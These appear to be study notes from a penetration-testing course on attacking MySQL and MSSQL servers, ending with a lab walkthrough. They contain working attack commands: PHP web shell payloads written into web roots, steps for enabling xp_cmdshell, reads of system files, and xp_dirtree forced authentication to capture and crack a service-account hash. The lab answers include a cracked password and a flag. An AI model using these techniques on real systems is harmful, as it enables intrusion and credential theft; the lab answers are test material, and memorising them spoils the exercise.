Attacking SQL Databases: Study Notes
Core idea

MySQL and MSSQL are relational DBMSs storing data in tables/columns/rows, queried with SQL.

Databases are high-value targets: they hold credentials, PII, business data, payment info — and are often run with highly privileged service accounts. Gaining access can open the door to lateral movement and privilege escalation.
Enumeration

Default ports:
Service 	Port
MSSQL 	TCP/1433, UDP/1434
MSSQL "hidden mode" 	TCP/2433
MySQL 	TCP/3306

nmap -Pn -sV -sC -p1433 10.10.10.125

Reveals version, hostname, domain info — used to spot misconfigurations and known vulns.
Authentication mechanisms

MSSQL — two modes:
Mode 	Description
Windows authentication 	Default/"integrated security" — trusts specific Windows/AD users or groups; already-authenticated Windows users don't need to re-auth
Mixed mode 	Supports both Windows/AD accounts and SQL Server's own username/password pairs

MySQL: supports username/password and Windows auth (via plugin). Misconfigurations can arise depending on which mode is used.
Known auth-bypass vuln: CVE-2012-2122 (MySQL 5.6.x)

A comparison bug meant repeatedly trying the same incorrect password for a valid username had a chance of being accepted. MySQL 5.6.x responds slower to incorrect passwords than correct ones — repeated attempts can eventually produce a false "correct" result, logging you in without knowing the real password.
Misconfigurations

Access without credentials becomes possible when:

    Anonymous access is enabled
    A user exists with no password
    Any user/group/machine is permitted to connect

What privileges can get you

Depending on the compromised user's rights:

    Read or change database contents
    Read or change server configuration
    Execute commands
    Read local files
    Communicate with other databases
    Capture the local system hash
    Impersonate existing users
    Gain access to other networks

Connecting to the server

MySQL:

mysql -u julio -pPassword123 -h 10.129.20.13

MSSQL — sqlcmd (Windows):

sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

-y / -Y = SQLCMDMAXVARTYPEWIDTH / SQLCMDMAXFIXEDTYPEWIDTH, for cleaner output (may cost performance).

MSSQL — sqsh (Linux alternative):

sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

-h disables headers/footers for cleaner output.

MSSQL — Impacket mssqlclient.py:

mssqlclient.py -p 1433 julio@10.129.203.7

Windows Authentication vs SQL Authentication:

    No domain/hostname specified → assumes SQL Authentication
    Domain or hostname specified → uses Windows Authentication
    Local account: use SERVERNAME\accountname or .\accountname

sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

Default system databases (enumeration targets)

MySQL:
DB 	Purpose
mysql 	System tables the server needs internally
information_schema 	Database metadata
performance_schema 	Low-level server execution monitoring
sys 	Helper objects for interpreting performance_schema data

MSSQL:
DB 	Purpose
master 	Info for the SQL Server instance itself
msdb 	Used by SQL Server Agent
model 	Template copied for every new DB
resource 	Read-only; system objects visible in every DB's sys schema
tempdb 	Temporary objects for queries

(Note: you'll get an error trying to list/connect to a DB you lack permission for.)
Core SQL syntax (enumeration)
Action 	MySQL 	MSSQL
Show databases 	SHOW DATABASES; 	SELECT name FROM master.dbo.sysdatabases + GO
Select a database 	USE htbusers; 	USE htbusers + GO
Show tables 	SHOW TABLES; 	SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES + GO
Dump a table 	SELECT * FROM users; 	SELECT * FROM users + go

(MSSQL via sqlcmd requires GO to actually execute the preceding statement.)
Command execution
MSSQL — xp_cmdshell

Extended stored procedure for running OS commands via SQL.

Key facts:

    Disabled by default
    The spawned process runs with the same rights as the SQL Server service account
    Runs synchronously — caller waits for the command to finish

xp_cmdshell 'whoami'
GO

Enabling it (needs sufficient privileges):

EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

Other (out-of-scope-here) RCE routes: extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, external scripts; also xp_regwrite for registry-based privilege escalation.
MySQL — User Defined Functions (UDFs)

MySQL supports UDFs that run C/C++ code as a SQL function — including a command-execution UDF (available on GitHub). Uncommon in production, but worth checking for.
Writing local files
MySQL

No xp_cmdshell equivalent, but if MySQL backs a web server (PHP, ASP.NET, etc.) and you have privileges, you can write a web shell via SELECT INTO OUTFILE:

SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Gatekeeper: secure_file_priv controls LOAD DATA / SELECT…INTO OUTFILE / LOAD_FILE():
Value 	Effect
Empty 	No restriction — insecure
A directory path 	Import/export limited to that directory
NULL 	Import/export disabled entirelyDo

Check it:

show variables like "secure_file_priv";

MSSQL

Needs Ole Automation Procedures enabled (requires admin):

sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

Then create a file via sp_OACreate / sp_OAMethod:

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO

Reading local files
MSSQL (file read access tied to the service account's OS permissions)

SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO

MySQL (off by default; needs correct settings + privileges)

select LOAD_FILE("/etc/passwd");

Capturing the MSSQL service account hash

Same idea as SMB forced-authentication (Responder): trick the SQL service into authenticating to your SMB server, capturing its NetNTLMv2 hash — using undocumented stored procedures that list a remote directory over SMB: xp_dirtree or xp_subdirs.

Steps:

    Start a listener: Responder or impacket-smbserver
    Trigger the SMB lookup from SQL:

EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO

or

EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO

    If the service account can reach your listener, you capture its NTLMv2 hash.

With Responder:

sudo responder -I tun0

With Impacket's SMB server:

sudo impacket-smbserver share ./ -smb2support

Once captured, you can crack the hash or relay it (as covered in the SMB attacks note).
Impersonating existing users (MSSQL)

IMPERSONATE permission lets a user take on another user/login's rights until reset or session end. Sysadmins can impersonate anyone by default; others need it explicitly granted.

Find who you can impersonate:

SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

Check your current privilege level:

SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

(0 = not sysadmin)

Impersonate:

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

(1 returned = now effectively sysadmin)

Tip: run EXECUTE AS LOGIN from the master DB (everyone has access there) to avoid errors if the target user lacks access to your current DB — USE master first if needed.

Revert:

REVERT

If not sysadmin and no useful impersonation target: still check access to other databases or linked servers.
Linked servers (lateral movement within MSSQL)

Linked servers let a SQL Server instance run Transact-SQL against tables on another SQL Server (or another DB product, e.g. Oracle).

Identify linked/remote servers:

SELECT srvname, isremote FROM sysservers
GO

isremote = 1 → remote server; 0 → linked server.

Run a pass-through query on a linked server:

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO

    Wrap the command in parentheses, name the linked server in [ ]
    Escape single quotes with doubled single quotes inside the pass-through query
    Chain multiple commands with ;

If the linked-server credentials have sysadmin rights there too, you now control that instance — read any database, or run xp_cmdshell on it.
Pentester's quick checklist

    nmap -sV -sC -p1433 (MSSQL) / check 3306 (MySQL) — grab version/hostname
    Try connecting with found/default creds via mysql, sqlcmd, sqsh, or mssqlclient.py
    Enumerate default system DBs, then real databases → tables → interesting columns (creds, tokens, PII)
    Check for command execution: xp_cmdshell (MSSQL) or a UDF (MySQL)
    Check file read/write capability (OPENROWSET/LOAD_FILE, secure_file_priv, Ole Automation) — a web shell drop here can chain into full RCE
    Try to steal the service hash via xp_dirtree/xp_subdirs pointed at your Responder/impacket-smbserver listener
    Check IMPERSONATE rights — can you become sa?
    Enumerate linked servers — can you pivot to another instance with higher privileges?

One-line summary

    SQL servers are a goldmine precisely because of their privileges: enumerate data first, then escalate through command execution, file read/write, hash theft, impersonation, or linked servers — any one of which can hand you the keys to the whole instance.

Question 1
What is the password for the "mssqlsvc" user?
> sudo /home/checkmate/.local/bin/responder -I tun0

> /opt/mssql-tools18/bin/sqlcmd -S 10.129.221.109 -U htbdbuser -P 'MSSQLAccess01!' -C
1> EXEC master..xp_dirtree '\\10.10.17.56\share\'
2> go
> echo "mssqlsvc::WIN-02:c71eb3e24a744232:B0A21A78644488E225D407B11056866C:01010000000000000066CF002854DD019C545FC6621ADEB100000000020008004C0054003400480001001E00570049004E002D0047004300330054004C004C003300340038005A00300004003400570049004E002D0047004300330054004C004C003300340038005A0030002E004C005400340048002E004C004F00430041004C00030014004C005400340048002E004C004F00430041004C00050014004C005400340048002E004C004F00430041004C00070008000066CF002854DD0106000400020000000800300030000000000000000000000000300000A3DBE774219C3943B0DC09D33D0194DD891D858119F037221A25166DBC033EDC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00350036000000000000000000" > mss.hash
> hashcat -m 5600 mss.hash /home/checkmate/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt
(princess1)

Question 2
Enumerate the "flagDB" database and submit a flag as your answer.
> mssqlclient.py 'WIN-02/mssqlsvc:princess1'@10.129.203.12 -windows-auth
SQL (WIN-02\mssqlsvc  guest@master)> SELECT name FROM flagDB.sys.tables;
tb_flag   
SQL (WIN-02\mssqlsvc  guest@master)> SELECT * FROM flagDB.dbo.tb_flag;
flagvalue                           
---------------------------------   
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}   

